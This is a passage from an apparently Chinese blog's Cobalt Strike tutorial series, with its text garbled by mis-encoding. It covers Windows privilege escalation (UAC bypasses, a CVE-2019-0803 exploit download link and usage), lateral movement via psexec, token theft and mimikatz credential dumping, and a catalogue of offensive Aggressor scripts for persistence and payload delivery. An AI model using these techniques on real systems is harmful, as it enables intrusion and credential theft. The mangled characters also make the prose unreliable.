id="ms14-058-x2F-ms15-051-x2F-ms16-016-x2F-ms16-032"><a href="#ms14-058-x2F-ms15-051-x2F-ms16-016-x2F-ms16-032" class="headerlink" title="ms14-058&#x2F;ms15-051&#x2F;ms16-016&#x2F;ms16-032"></a>ms14-058&#x2F;ms15-051&#x2F;ms16-016&#x2F;ms16-032</h3><p>è¿™äº›éƒ½æ˜¯å¤§å®¶è€³ç†Ÿèƒ½è¯¦çš„Windowsæœ¬åœ°ææƒæ¼æ´ï¼Œåœ¨æ­¤æ’ä»¶ä¸­éƒ½å·²ç»é›†æˆ</p><h3 id="UAC-DLL"><a href="#UAC-DLL" class="headerlink" title="UAC-DLL"></a>UAC-DLL</h3><p>è¿™æ˜¯ä¸€ç§ç»•è¿‡UACçš„æ”»å‡»ï¼Œå®ƒè¯•å›¾å°†æœ¬åœ°ç®¡ç†å‘˜è¿è¡Œçš„æœ‰æ•ˆè´Ÿè½½ä»ä½æƒé™æå‡åˆ°é«˜æƒé™ã€‚æ­¤æ”»å‡»ä½¿ç”¨UACæ¼æ´å°†ArtifactKitç”Ÿæˆçš„DLLå¤åˆ¶åˆ°ç‰¹æƒä½ç½®ã€‚æ­¤æ”»å‡»é€‚ç”¨äºWindows7å’ŒWindows8åŠæ›´é«˜ç‰ˆæœ¬çš„æœªä¿®è¡¥ç‰ˆæœ¬ã€‚</p><h3 id="uac-token-duplication"><a href="#uac-token-duplication" class="headerlink" title="uac-token-duplication"></a>uac-token-duplication</h3><p>è¿™æ˜¯å¦ä¸€ç§ç»•è¿‡UACçš„æ”»å‡»ï¼Œå°†å…¶ä»ä½æƒé™æå‡åˆ°é«˜æƒé™ï¼ˆä½œä¸ºæœ¬åœ°ç®¡ç†å‘˜ï¼‰ã€‚è¿™ç§æ”»å‡»ä½¿ç”¨ä¸€ä¸ªUACæ¼æ´ï¼Œå…è®¸éæå‡è¿›ç¨‹ä½¿ç”¨ä»æå‡è¿›ç¨‹ä¸­çªƒå–çš„ä»¤ç‰Œå¯åŠ¨ä»»æ„è¿›ç¨‹ã€‚æ­¤æ¼æ´è¦æ±‚æ”»å‡»åˆ é™¤åˆ†é…ç»™æå‡ä»¤ç‰Œçš„å¤šä¸ªæƒé™ã€‚æ­¤æ”»å‡»é€‚ç”¨äºWindows7åŠæ›´é«˜ç‰ˆæœ¬ã€‚å¦‚æœAlwaysNotifyå¤„äºå…¶æœ€é«˜è®¾ç½®ï¼Œåˆ™æ­¤æ”»å‡»è¦æ±‚æå‡çš„è¿›ç¨‹å·²åœ¨å½“å‰æ¡Œé¢ä¼šè¯ä¸­è¿è¡Œï¼ˆä½œä¸ºåŒä¸€ç”¨æˆ·ï¼‰,æ­¤æ¼æ´ä½¿ç”¨PowerShellç”Ÿæˆä¼šè¯ã€‚</p><h3 id="Uac-eventvwr"><a href="#Uac-eventvwr" class="headerlink" title="Uac-eventvwr"></a>Uac-eventvwr</h3><p>è¿™ç§ææƒæ–¹æ³•æ˜¯åˆ©ç”¨æ—¶é—´æŸ¥çœ‹å™¨eventvwrï¼Œé€šè¿‡æ³¨å†Œè¡¨ä¹‹åï¼Œæ‰§è¡ŒEventvwr.exeä¼šè‡ªåŠ¨åŠ è½½æˆ‘ä»¬çš„A.exe(exp),è¿™ä¸ªæ—¶å€™ä»–çš„æƒé™å°±æ˜¯é«˜äº†ï¼ŒæˆåŠŸç»•è¿‡UAV<br><a href="https://imgchr.com/i/e1dLIx"><img src="https://s2.ax1x.com/2019/07/29/e1dLIx.png" alt="e1dLIx.png"></a></p><h3 id="Uac-wscript"><a href="#Uac-wscript" class="headerlink" title="Uac-wscript"></a>Uac-wscript</h3><p>è¿™ç§ç»•è¿‡uacææƒçš„æ–¹æ³•æœ€åˆæ˜¯åœ¨Empireæ¡†æ¶ä¸­ç°èº«çš„ï¼Œè¯¥æ–¹æ³•åªé’ˆå¯¹Windows7æœ‰æ•ˆ</p><h3 id="2-è‡ªç”¨EXPææƒ"><a href="#2-è‡ªç”¨EXPææƒ" class="headerlink" title="2.è‡ªç”¨EXPææƒ"></a>2.è‡ªç”¨EXPææƒ</h3><p>è¿™ç§æ–¹å¼å°±æ˜¯æ¯”è¾ƒå¸¸è§„çš„æ–¹æ³•ï¼Œè‡ªå·±ä¸Šä¼ æœ€æ–°çš„EXPè¿›è¡Œææƒï¼Œè‡³äºæ–‡ä»¶ä¸Šä¼ å’Œæ‰§è¡Œçš„æ–¹æ³•ï¼Œä¹‹å‰å·²ç»è®²è¿‡ï¼Œåœ¨æ­¤ä¸å¤šèµ˜è¿°<br>æœ€è¿‘æµ‹è¯•CVE-2019-0803çš„ææƒæ•ˆæœä¸é”™ï¼Œå½±å“ç‰ˆæœ¬éå¸¸å¹¿</p><pre><code>Microsoft Windows Server 2019 0Microsoft Windows Server 2016 0Microsoft Windows Server 2012 R2 0Microsoft Windows Server 2012 0Microsoft Windows Server 2008 R2 for x64-based Systems SP1Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1Microsoft Windows Server 2008 for x64-based Systems SP2Microsoft Windows Server 2008 for Itanium-based Systems SP2Microsoft Windows Server 2008 for 32-bit Systems SP2Microsoft Windows Server 1803 0Microsoft Windows Server 1709 0Microsoft Windows RT 8.1Microsoft Windows 8.1 for x64-based Systems 0Microsoft Windows 8.1 for 32-bit Systems 0Microsoft Windows 7 for x64-based Systems SP1Microsoft Windows 7 for 32-bit Systems SP1Microsoft Windows 10 Version 1809 for x64-based Systems 0Microsoft Windows 10 Version 1809 for ARM64-based Systems 0Microsoft Windows 10 Version 1809 for 32-bit Systems 0Microsoft Windows 10 Version 1803 for x64-based Systems 0Microsoft Windows 10 Version 1803 for ARM64-based Systems 0Microsoft Windows 10 Version 1803 for 32-bit Systems 0Microsoft Windows 10 version 1709 for x64-based Systems 0Microsoft Windows 10 Version 1709 for ARM64-based Systems 0Microsoft Windows 10 version 1709 for 32-bit Systems 0Microsoft Windows 10 version 1703 for x64-based Systems 0Microsoft Windows 10 version 1703 for 32-bit Systems 0Microsoft Windows 10 Version 1607 for x64-based Systems 0Microsoft Windows 10 Version 1607 for 32-bit Systems 0Microsoft Windows 10 for x64-based Systems 0Microsoft Windows 10 for 32-bit Systems 0</code></pre><p>EXPçš„ä¸‹è½½é“¾æ¥ä¸º:<a href="https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe">https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe</a><br>ç”¨æ³•:CVE-2019-0803.exe cmd cmdlineï¼Œå¯èƒ½éœ€è¦å¤šæ‰§è¡Œå‡ æ¬¡æ‰å¯ä»¥æˆåŠŸ<br><a href="https://imgchr.com/i/e1dqd1"><img src="https://s2.ax1x.com/2019/07/29/e1dqd1.png" alt="e1dqd1.png"></a></p><h3 id="3-Powershellææƒ"><a href="#3-Powershellææƒ" class="headerlink" title="3.Powershellææƒ"></a>3.Powershellææƒ</h3><p>åœ¨æ­¤éœ€è¦ä½¿ç”¨beaconä¸­çš„å‘½ä»¤-powershell-import</p><pre><code>beacon&gt; help powershell-importUse: powershell-import [/path/to/local/script.ps1]Import a powershell script which is combined with futurecalls to the powershell command. You may only use oneimported script at a time.</code></pre><p><a href="https://imgchr.com/i/e1djJK"><img src="https://s2.ax1x.com/2019/07/29/e1djJK.png" alt="e1djJK.png"></a><br>ä½¿ç”¨ powershell-import æœ¬åœ°å¯¼å…¥æˆ‘ä»¬çš„è„šæœ¬ï¼Œpowershellæ‰§è¡Œ,PowerUp.ps1 è¿™ä¸ªæ¨¡å—æ˜¯ä¸ªææƒè¾…åŠ©æ¨¡å—<br>ä¸‹è½½é“¾æ¥:<a href="https://github.com/HarmJ0y/PowerUp">https://github.com/HarmJ0y/PowerUp</a></p><h2 id="0x002-æ¨ªå‘ç§»åŠ¨"><a href="#0x002-æ¨ªå‘ç§»åŠ¨" class="headerlink" title="0x002-æ¨ªå‘ç§»åŠ¨"></a>0x002-æ¨ªå‘ç§»åŠ¨</h2><h3 id="æ¨ªå‘æ¸—é€æ¦‚å¿µ"><a href="#æ¨ªå‘æ¸—é€æ¦‚å¿µ" class="headerlink" title="æ¨ªå‘æ¸—é€æ¦‚å¿µ:"></a>æ¨ªå‘æ¸—é€æ¦‚å¿µ:</h3><p>æ¨ªå‘æ¸—é€æ”»å‡»æŠ€æœ¯æ˜¯å¤æ‚ç½‘ç»œæ”»å‡»ä¸­å¹¿æ³›ä½¿ç”¨çš„ä¸€ç§æŠ€æœ¯ï¼Œç‰¹åˆ«æ˜¯åœ¨é«˜çº§æŒç»­å¨èƒï¼ˆAdvanced Persistent Threatsï¼ŒAPTï¼‰ä¸­æ›´åŠ çƒ­è¡·äºä½¿ç”¨è¿™ç§æ”»å‡»æ–¹æ³•ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æŠ€æœ¯ï¼Œä»¥è¢«æ”»é™·çš„ç³»ç»Ÿä¸ºè·³æ¿ï¼Œè®¿é—®å…¶ä»–ä¸»æœºï¼Œè·å–åŒ…æ‹¬é‚®ç®±ã€å…±äº«æ–‡ä»¶å¤¹æˆ–è€…å‡­è¯ä¿¡æ¯åœ¨å†…çš„æ•æ„Ÿèµ„æºã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ•æ„Ÿä¿¡æ¯ï¼Œè¿›ä¸€æ­¥æ§åˆ¶å…¶ä»–ç³»ç»Ÿã€æå‡æƒé™æˆ–çªƒå–æ›´å¤šæœ‰ä»·å€¼çš„å‡­è¯ã€‚å€ŸåŠ©æ­¤ç±»æ”»å‡»ï¼Œæ”»å‡»è€…æœ€ç»ˆå¯èƒ½è·å–åŸŸæ§çš„è®¿é—®æƒé™ï¼Œå®Œå…¨æ§åˆ¶åŸºäºWindowsç³»ç»Ÿçš„åŸºç¡€è®¾æ–½æˆ–ä¸ä¸šåŠ¡ç›¸å…³çš„å…³é”®è´¦æˆ·ã€‚<br>åœ¨ææƒåï¼Œæˆ‘ä»¬å¯ä»¥ç”¨mimikatz dumpç›®æ ‡æœºçš„å‡­è¯ï¼Œå¹¶è¿›è¡Œå†…ç½‘æ¨ªå‘ç§»åŠ¨</p><h3 id="1-Psexecæ¨ªå‘ç§»åŠ¨"><a href="#1-Psexecæ¨ªå‘ç§»åŠ¨" class="headerlink" title="1.Psexecæ¨ªå‘ç§»åŠ¨"></a>1.Psexecæ¨ªå‘ç§»åŠ¨</h3><p>åœ¨æ‰§è¡Œç«¯å£æ‰«æå<br>ç›®æ ‡è§†å›¾ä¸­ï¼Œé€‰æ‹©ä¸€ä¸ªç›®æ ‡ï¼Œå³é”®â€“&gt;ç™»å½•â€“p**ecï¼Œå³å¯é€‰æ‹©å‡­è¯è¿›è¡Œæ¨ªå‘ç§»åŠ¨<br><a href="https://imgchr.com/i/e1dXi6"><img src="https://s2.ax1x.com/2019/07/29/e1dXi6.png" alt="e1dXi6.png"></a><br><a href="https://imgchr.com/i/e1dvRO"><img src="https://s2.ax1x.com/2019/07/29/e1dvRO.png" alt="e1dvRO.png"></a></p><p>å¦‚æœè¯¥æœºä½¿ç”¨äº†å’Œä¹‹å‰çš„ç›®æ ‡æœºä¸€æ ·çš„å‡­è¯ï¼Œåˆ™ä¼šæˆåŠŸè¿”å›ä¸€ä¸ªsystem beacon<br><a href="https://imgchr.com/i/e1wpsH"><img src="https://s2.ax1x.com/2019/07/29/e1wpsH.png" alt="e1wpsH.png"></a></p><h3 id="2-çªƒå–ä»¤ç‰Œ"><a href="#2-çªƒå–ä»¤ç‰Œ" class="headerlink" title="2.çªƒå–ä»¤ç‰Œ"></a>2.çªƒå–ä»¤ç‰Œ</h3><p>åœ¨è¿›ç¨‹åˆ—è¡¨ä¸­ï¼Œå¯»æ‰¾ä»¥åŸŸç®¡ç†å‘˜èº«ä»½è¿è¡Œçš„è¿›ç¨‹ï¼Œå¹¶é€‰å®šè¿›è¡Œsteal tokenï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™ä¼šè¿”å›åŸŸç®¡æƒé™çš„beaconï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹ç»ä¸ä¼šé‚£ä¹ˆç®€å•çš„â€¦åœ¨æ­¤å°±ä¸æ¼”ç¤ºäº†ã€‚<br><a href="https://imgchr.com/i/e1dxzD"><img src="https://s2.ax1x.com/2019/07/29/e1dxzD.png" alt="e1dxzD.png"></a></p><h3 id="3-å…¶ä»–æ‰‹æ®µæ¨ªå‘ç§»åŠ¨"><a href="#3-å…¶ä»–æ‰‹æ®µæ¨ªå‘ç§»åŠ¨" class="headerlink" title="3.å…¶ä»–æ‰‹æ®µæ¨ªå‘ç§»åŠ¨"></a>3.å…¶ä»–æ‰‹æ®µæ¨ªå‘ç§»åŠ¨</h3><p>â‘ ä½¿ç”¨å„ç§ç³»ç»Ÿæ¼æ´:æ¯”å¦‚è¯´ç”¨ms17-010ï¼Œms08-067æ‰¹é‡æ£€æµ‹ä¸€ä¸‹å†…ç½‘~<br>æˆ‘ä¹‹å‰çš„å¸–å­å‘è¿‡cobaltstrikeä¸­ms17-10çš„åˆ©ç”¨è„šæœ¬ï¼Œè²Œä¼¼æ˜¯ä»Empireæ¡†æ¶ä¸Šæ‹”ä¸‹æ¥çš„ã€‚å¦‚å›¾ï¼Œè¯¥è„šæœ¬é›†æˆäº†æ‰«æä¸æ¼æ´åˆ©ç”¨ï¼Œå¯è°“æ˜¯éå¸¸æ–¹ä¾¿<br><a href="https://imgchr.com/i/e1w9Ld"><img src="https://s2.ax1x.com/2019/07/29/e1w9Ld.png" alt="e1w9Ld.png"></a><br>PS:ç­‰åˆ°cve2019-0708ä¸€å‡ºï¼Œåˆæ˜¯ä¸€åœºè…¥é£è¡€é›¨</p><p>â‘¡å¼±å£ä»¤æ£€æµ‹<br>å†…ç½‘ä¸­sshå¼±å£ä»¤ï¼Œå„ç§æ•°æ®åº“çš„å¼±å£ä»¤å¯è°“æ˜¯å±‚å‡ºä¸ç©·ã€‚Mysqlå¯ä»¥mofææƒï¼Œsqlserverå¯ä»¥xp_cmdshell,rediså†™shellï¼Œoracleä¹Ÿæœ‰æ–¹æ³•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>â‘¢ä¸­é—´ä»¶æ¼æ´<br>è¿™ä¸ªå°±éå¸¸å¸¸è§äº†ï¼Œæ¯”å¦‚weblogicå„ç§rceæ¼æ´ï¼Œtomcatå¼±å£ä»¤ç­‰ç­‰</p><p>â‘£Webç«¯æ¼æ´<br>æŒ–æ˜webç«¯æ¼æ´ï¼Œå¤§å®¶éƒ½æ‡‚</p><p>â‘¤åŸŸå†…æ¼æ´<br>å§”æ´¾ã€åŸŸå†…æƒé™ç­–ç•¥é…ç½®é—®é¢˜ç­‰</p><p>â‘¤å¯†ç çˆ†ç ´ã€å–·æ´’ç­‰</p><p>å¤§å®¶è‡ªè¡Œæ€»ç»“~</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(å)å®‰è£…æ‰©å±•</title>
      <link href="/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81-%E5%AE%89%E8%A3%85%E6%89%A9%E5%B1%95/"/>
      <url>/2019/06/16/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81-%E5%AE%89%E8%A3%85%E6%89%A9%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x001-æ‰©å±•çš„åŠ è½½"><a href="#0x001-æ‰©å±•çš„åŠ è½½" class="headerlink" title="0x001-æ‰©å±•çš„åŠ è½½"></a>0x001-æ‰©å±•çš„åŠ è½½</h2><p>æ‰©å±•æ˜¯Cobaltstrikeä¸€ä¸ªæä¸ºé‡è¦çš„æ¨¡å—ï¼Œå®ƒæœ‰æ•ˆåœ°ä¸°ç›ˆäº†cobaltstrikeçš„åŠŸèƒ½<br>é€‰æ‹©èœå•æ çš„CobaltStrikeâ€“&gt;è„šæœ¬ç®¡ç†å™¨ï¼Œç‚¹å‡»loadï¼Œç„¶åé€‰æ‹©cnaæ‰©å±•æ–‡ä»¶å³å¯ï¼Œæ—è¾¹çš„unloadä¸ºå»é™¤è¯¥æ‰©å±•ï¼Œï¼Œreloadä¸ºé‡æ–°åŠ è½½è¯¥æ‰©å±•<br><a href="https://imgchr.com/i/e18Nsx"><img src="https://s2.ax1x.com/2019/07/28/e18Nsx.png" alt="e18Nsx.png"></a></p><h2 id="0x002-ä¸ªäººå¸¸ç”¨æ‰©å±•"><a href="#0x002-ä¸ªäººå¸¸ç”¨æ‰©å±•" class="headerlink" title="0x002-ä¸ªäººå¸¸ç”¨æ‰©å±•"></a>0x002-ä¸ªäººå¸¸ç”¨æ‰©å±•</h2><p>æœ¬äººåœ¨æ­¤æ”¾å‡ºå‡ ä¸ªè‡ªå·±å¸¸ç”¨çš„æ‰©å±•ï¼Œè€å“¥ä»¬å¯ä»¥å›å¤ä¸‹è½½<br><a href="https://imgchr.com/i/e1Gete"><img src="https://s2.ax1x.com/2019/07/28/e1Gete.png" alt="e1Gete.png"></a></p><h2 id="0x003-å…¶ä»–æ‰©å±•æ±‡æ€»-æ¥è‡ªWBGè€å“¥"><a href="#0x003-å…¶ä»–æ‰©å±•æ±‡æ€»-æ¥è‡ªWBGè€å“¥" class="headerlink" title="0x003-å…¶ä»–æ‰©å±•æ±‡æ€»(æ¥è‡ªWBGè€å“¥)"></a>0x003-å…¶ä»–æ‰©å±•æ±‡æ€»(æ¥è‡ªWBGè€å“¥)</h2><h3 id="è„šæœ¬åç§°ï¼šelevate-cna"><a href="#è„šæœ¬åç§°ï¼šelevate-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šelevate.cna"></a>è„šæœ¬åç§°ï¼šelevate.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šå¢åŠ äº”ç§ææƒæ–¹å¼<br><a href="https://imgchr.com/i/e18JzR"><img src="https://s2.ax1x.com/2019/07/28/e18JzR.png" alt="e18JzR.png"></a></p><h3 id="è„šæœ¬åç§°ï¼šProcessTree-cna"><a href="#è„šæœ¬åç§°ï¼šProcessTree-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šProcessTree.cna"></a>è„šæœ¬åç§°ï¼šProcessTree.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šè®©pså‘½ä»¤å¯ä»¥æ˜¾ç¤ºçˆ¶å­å…³ç³»å¹¶æ˜¾ç¤ºé¢œè‰²<br><a href="https://imgchr.com/i/e18wdO"><img src="https://s2.ax1x.com/2019/07/28/e18wdO.png" alt="e18wdO.png"></a></p><h3 id="è„šæœ¬åç§°ï¼šCVE-2018-4878-cna"><a href="#è„šæœ¬åç§°ï¼šCVE-2018-4878-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šCVE-2018-4878.cna"></a>è„šæœ¬åç§°ï¼šCVE-2018-4878.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šCVE-2018-4878.cna</p><p><a href="https://imgchr.com/i/e18GW9"><img src="https://s2.ax1x.com/2019/07/28/e18GW9.png" alt="e18GW9.png"></a></p><h3 id="è„šæœ¬åç§°ï¼šArtifactPayloadGenerator-cna"><a href="#è„šæœ¬åç§°ï¼šArtifactPayloadGenerator-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šArtifactPayloadGenerator.cna"></a>è„šæœ¬åç§°ï¼šArtifactPayloadGenerator.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šåˆ›å»ºå¤šç§ç±»å‹çš„payloadã€‚ç”Ÿæˆçš„æ–‡ä»¶åœ¨csç›®å½•ä¸‹çš„opt\cobaltstrike<br><a href="https://imgchr.com/i/e18UL6"><img src="https://s2.ax1x.com/2019/07/28/e18UL6.png" alt="e18UL6.png"></a></p><h3 id="è„šæœ¬åç§°ï¼šAVQuery-cna"><a href="#è„šæœ¬åç§°ï¼šAVQuery-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šAVQuery.cna"></a>è„šæœ¬åç§°ï¼šAVQuery.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šæŸ¥è¯¢ç›®æ ‡æ‰€å®‰è£…çš„æ‰€æœ‰æ€è½¯</p><h3 id="è„šæœ¬åç§°ï¼šCertUtilWebDelivery-cna"><a href="#è„šæœ¬åç§°ï¼šCertUtilWebDelivery-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šCertUtilWebDelivery.cna"></a>è„šæœ¬åç§°ï¼šCertUtilWebDelivery.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šåˆ©ç”¨CertUtilå’Œrundll32ç”Ÿæˆä¼šè¯è¿™ä¸ªåº”è¯¥éƒ½çŸ¥é“äº†è§£</p><h3 id="è„šæœ¬åç§°ï¼šRedTeamRepo-cna"><a href="#è„šæœ¬åç§°ï¼šRedTeamRepo-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šRedTeamRepo.cna"></a>è„šæœ¬åç§°ï¼šRedTeamRepo.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šå°±æ˜¯æç¤ºä¸€ä¸‹å¸¸ç”¨çš„æ¸—é€å‘½ä»¤<br><a href="https://imgchr.com/i/e180oD"><img src="https://s2.ax1x.com/2019/07/28/e180oD.png" alt="e180oD.png"></a></p><h3 id="è„šæœ¬åç§°ï¼šProcessColor-cna"><a href="#è„šæœ¬åç§°ï¼šProcessColor-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šProcessColor.cna"></a>è„šæœ¬åç§°ï¼šProcessColor.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šæ˜¾ç¤ºå¸¦æœ‰é¢œè‰²çš„è¿›ç¨‹åˆ—è¡¨(ä¸åŒé¢œè‰²æœ‰ä¸åŒå«ä¹‰)<br>[<img src="https://s2.ax1x.com/2019/07/28/e18byq.png" alt="e18byq.png">]</p><h3 id="è„šæœ¬åç§°ï¼šEDR-cna"><a href="#è„šæœ¬åç§°ï¼šEDR-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šEDR.cna"></a>è„šæœ¬åç§°ï¼šEDR.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šæ£€æŸ¥æœ‰æ— ç»ˆç«¯å®‰å…¨äº§å“</p><h3 id="è„šæœ¬åç§°ï¼šlogvis-cna"><a href="#è„šæœ¬åç§°ï¼šlogvis-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šlogvis.cna"></a>è„šæœ¬åç§°ï¼šlogvis.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šæ˜¾ç¤ºBeaconå‘½ä»¤æ—¥å¿—<br><img src="https://s2.ax1x.com/2019/07/28/e1Gfj1.png" alt="e1Gfj1.png"></p><h3 id="è„šæœ¬åç§°ï¼šProcessMonitor-cna"><a href="#è„šæœ¬åç§°ï¼šProcessMonitor-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šProcessMonitor.cna"></a>è„šæœ¬åç§°ï¼šProcessMonitor.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šè®°å½•ä¸€æ®µæ—¶é—´å†…ç¨‹åºå¯åŠ¨çš„æƒ…å†µ</p><h3 id="è„šæœ¬åç§°ï¼šSMBPayloadGenerator-cna"><a href="#è„šæœ¬åç§°ï¼šSMBPayloadGenerator-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šSMBPayloadGenerator.cna"></a>è„šæœ¬åç§°ï¼šSMBPayloadGenerator.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šç”ŸæˆåŸºäºSMBçš„payload</p><h3 id="è„šæœ¬åç§°ï¼šPersistence-x2F-Persistence-Menu-cna"><a href="#è„šæœ¬åç§°ï¼šPersistence-x2F-Persistence-Menu-cna" class="headerlink" title="è„šæœ¬åç§°ï¼šPersistence&#x2F;Persistence_Menu.cna"></a>è„šæœ¬åç§°ï¼šPersistence&#x2F;Persistence_Menu.cna</h3><p>è„šæœ¬åŠŸèƒ½ï¼šæŒä¹…åŒ–æ§åˆ¶é›†åˆ<br>å¤‡æ³¨:è¿™ä¸ªè„šæœ¬æ˜¯åŒç›®å½•è„šæœ¬çš„ä¸€ä¸ªé›†åˆ<br><a href="https://imgchr.com/i/e18xkF"><img src="https://s2.ax1x.com/2019/07/28/e18xkF.png" alt="e18xkF.png"></a></p><h3 id="è„šæœ¬åç§°ï¼šEternalblue-cna-è„šæœ¬åŠŸèƒ½ï¼šms17-010"><a href="#è„šæœ¬åç§°ï¼šEternalblue-cna-è„šæœ¬åŠŸèƒ½ï¼šms17-010" class="headerlink" title="è„šæœ¬åç§°ï¼šEternalblue.cna è„šæœ¬åŠŸèƒ½ï¼šms17-010"></a>è„šæœ¬åç§°ï¼šEternalblue.cna è„šæœ¬åŠŸèƒ½ï¼šms17-010</h3><p><a href="https://gist.github.com/rsmudge/9b54a66744a94f3950cc171254057942">https://gist.github.com/rsmudge/9b54a66744a94f3950cc171254057942</a><br>å¤‡æ³¨ï¼šè°ƒç”¨exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</p><p>æ›´å¤š:<a href="https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg">https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg</a><br>ä¸ªäººè®¤ä½è¿™ä½è€å“¥æ•´ç†çš„å·²ç»å¾ˆå…¨é¢äº†ï¼Œä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹æˆ‘å°†é‡Œé¢çš„ä¸€äº›é›†åˆè„šæœ¬ä»‹ç»å›¾ç‰‡åˆ—äº†å‡ºæ¥ã€‚</p><p><a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a><br><a href="https://imgchr.com/i/e186SA"><img src="https://s2.ax1x.com/2019/07/28/e186SA.png" alt="e186SA.png"></a></p><p><a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a><br><a href="https://imgchr.com/i/e18gyt"><img src="https://s2.ax1x.com/2019/07/28/e18gyt.png" alt="e18gyt.png"></a></p><p><a href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a><br><a href="https://imgchr.com/i/e18Wef"><img src="https://s2.ax1x.com/2019/07/28/e18Wef.png" alt="e18Wef.png"></a><br><a href="https://github.com/vysec/Aggressor-VYSEC">https://github.com/vysec/Aggressor-VYSEC</a><br><a href="https://imgchr.com/i/e18hTS"><img src="https://s2.ax1x.com/2019/07/28/e18hTS.png" alt="e18hTS.png"></a></p><p><a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit">https://github.com/killswitch-GUI/CobaltStrike-ToolKit</a><br><a href="https://imgchr.com/i/e185Fg"><img src="https://s2.ax1x.com/2019/07/28/e185Fg.png" alt="e185Fg.png"></a><br><a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a></p><p><a href="https://imgchr.com/i/e18oWj"><img src="https://s2.ax1x.com/2019/07/28/e18oWj.png" alt="e18oWj.png"></a></p><p><a href="https://github.com/rasta-mouse/Aggressor-Script">https://github.com/rasta-mouse/Aggressor-Script</a><br><a href="https://imgchr.com/i/e18Hln"><img src="https://s2.ax1x.com/2019/07/28/e18Hln.png" alt="e18Hln.png"></a><br><a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a><br><a href="https://imgchr.com/i/e18qO0"><img src="https://s2.ax1x.com/2019/07/28/e18qO0.png" alt="e18qO0.png"></a><br><a href="https://github.com/001SPARTaN/aggressor_scripts">https://github.com/001SPARTaN/aggressor_scripts</a><br><a href="https://imgchr.com/i/e18OmV"><img src="https://s2.ax1x.com/2019/07/28/e18OmV.png" alt="e18OmV.png"></a></p><p><a href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor">https://github.com/gaudard/scripts/tree/master/red-team/aggressor</a><br><a href="https://imgchr.com/i/e1GSfJ"><img src="https://s2.ax1x.com/2019/07/28/e1GSfJ.png" alt="e1GSfJ.png"></a><br><a href="https://github.com/branthale/CobaltStrikeCNA">https://github.com/branthale/CobaltStrikeCNA</a><br><a href="https://imgchr.com/i/e18XwT"><img src="https://s2.ax1x.com/2019/07/28/e18XwT.png" alt="e18XwT.png"></a><br><a href="https://github.com/threatexpress/aggressor-scripts">https://github.com/threatexpress/aggressor-scripts</a> <a href="https://github.com/threatexpress/red-team-scripts">https://github.com/threatexpress/red-team-scripts</a> <a href="https://github.com/threatexpress/persistence-aggressor-script">https://github.com/threatexpress/persistence-aggressor-script</a><br><a href="https://imgchr.com/i/e18jTU"><img src="https://s2.ax1x.com/2019/07/28/e18jTU.png" alt="e18jTU.png"></a></p><p><a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a><br><a href="https://imgchr.com/i/e18zY4"><img src="https://s2.ax1x.com/2019/07/28/e18zY4.png" alt="e18zY4.png"></a></p><p>è„šæœ¬æ¥æº:</p><p><a href="https://github.com/rsmudge/ElevateKit">https://github.com/rsmudge/ElevateKit</a><br><a href="https://github.com/vysec/CVE-2018-4878">https://github.com/vysec/CVE-2018-4878</a> <a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a> <a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a> <a href="https://github.com/ramen0x3f/AggressorScripts">https://github.com/ramen0x3f/AggressorScripts</a><br><a 